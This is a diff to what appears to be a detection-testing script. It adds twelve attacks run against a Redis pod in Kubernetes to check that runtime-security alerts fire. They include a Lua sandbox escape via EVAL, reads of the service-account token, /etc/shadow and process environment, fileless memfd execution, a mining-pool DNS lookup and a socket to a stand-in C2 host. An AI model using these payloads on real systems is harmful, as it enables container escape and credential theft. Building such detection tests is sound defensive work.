@@ -153,6 +153,52 @@ bin/bobctl tune \
 TUNE_EXIT=${PIPESTATUS[0]}
 set -e
 
+# ── redis post-tune: direct attack verification ─────────────────────────────
+if [[ "$APP" == "redis" ]]; then
+  log "=== Redis post-tune attack verification (12 attacks) ==="
+  REDIS_POD=$(kubectl -n redis get pod -l app.kubernetes.io/name=redis \
+    -o jsonpath='{.items[0].metadata.name}')
+
+  LUA_ESCAPE='local io_mod=nil;pcall(function() if type(io)=="table" and io.popen then io_mod=io end end);if not io_mod then pcall(function() local l=package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0","luaopen_io");if l then io_mod=l() end end) end;if not io_mod then return "sandbox_blocked" end;'
+
+  run_eval() {
+    local name="$1" script="$2"
+    echo -n "  [$name] "
+    result=$(kubectl -n redis exec "$REDIS_POD" -- redis-cli EVAL "$script" 0 2>&1) || true
+    echo "$(echo $result | head -c 80)"
+  }
+
+  # 1: Fileless memfd_create + execve (R1005)
+  log "Attack 1: Fileless memfd (R1005)"
+  kubectl -n redis exec "$REDIS_POD" -- perl -e '
+    my $name = "pwned\0";
+    my $fd = syscall(319, $name, 0);
+    die "memfd_create failed" if $fd < 0;
+    open(my $src, "<:raw", "/bin/echo") or die "open: $!";
+    open(my $dst, ">&=", $fd) or die "dup: $!";
+    binmode $dst; my $buf;
+    while (my $n = read($src, $buf, 8192)) { print $dst $buf; }
+    close($src);
+    exec("/proc/self/fd/$fd", "echo", "FILELESS-EXEC-DETECTED");
+  ' 2>&1 || echo "  memfd exec completed"
+
+  # 2-12: EVAL-based attacks via Lua sandbox escape
+  run_eval "SA-token-R0006" "${LUA_ESCAPE} local f=io_mod.popen('cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null || echo no_token');local o=f:read('*a');f:close();return o"
+  run_eval "shadow-R0010" "${LUA_ESCAPE} local f=io_mod.popen('cat /etc/shadow 2>&1; echo shadow_attempted');local o=f:read('*a');f:close();return o"
+  run_eval "whoami-R0001" "${LUA_ESCAPE} local f=io_mod.popen('whoami');local o=f:read('*a');f:close();return 'user:' .. o"
+  run_eval "dns-R0005" "${LUA_ESCAPE} local f=io_mod.popen('getent hosts evil.attacker.example.com 2>&1 || echo dns_done');local o=f:read('*a');f:close();return 'dns:' .. o"
+  run_eval "drifted-R1001" "${LUA_ESCAPE} local f=io_mod.popen('cp /bin/ls /tmp/drifted_redis && /tmp/drifted_redis /etc 2>&1; rm -f /tmp/drifted_redis');local o=f:read('*a');f:close();return 'drifted:' .. o"
+  run_eval "devshm-R1000" "${LUA_ESCAPE} local f=io_mod.popen('cp /bin/echo /dev/shm/malicious && /dev/shm/malicious pwned 2>&1; rm -f /dev/shm/malicious');local o=f:read('*a');f:close();return 'shm:' .. o"
+  run_eval "environ-R0008" "${LUA_ESCAPE} local f=io_mod.popen('cat /proc/1/environ 2>/dev/null | tr \"\\\\0\" \"\\\\n\" | head -1 || echo no_environ');local o=f:read('*a');f:close();return 'environ:' .. o"
+  run_eval "symlink-R1010" "${LUA_ESCAPE} local f=io_mod.popen('ln -sf /etc/shadow /tmp/shadow_link 2>&1; rm -f /tmp/shadow_link; echo symlink_done');local o=f:read('*a');f:close();return 'symlink:' .. o"
+  run_eval "mining-R1008" "${LUA_ESCAPE} local f=io_mod.popen('getent hosts xmr.pool.minergate.com 2>&1 || echo mining_dns_done');local o=f:read('*a');f:close();return 'mining:' .. o"
+  run_eval "perl-c2-R0001" "${LUA_ESCAPE} local f=io_mod.popen(\"perl -e 'use IO::Socket::INET;my \\$s=IO::Socket::INET->new(PeerAddr=>\\\"c2.evil.example.com\\\",PeerPort=>80,Timeout=>2);print defined \\$s ? \\\"ok\\\" : \\\"fail\\\";' 2>&1; echo done\");local o=f:read('*a');f:close();return 'c2:' .. o"
+  run_eval "creds-R0001" "${LUA_ESCAPE} local f=io_mod.popen(\"awk -F: '\\$3==0{print \\$1}' /etc/passwd && id 2>&1\");local o=f:read('*a');f:close();return 'creds:' .. o"
+
+  log "All 12 Redis attacks executed. Waiting for alert propagation..."
+  sleep 15
+fi
+
 # ── run attacks (separate pass for detection report) ─────────────────────────
 log "=== Run attacks ==="
 set +e
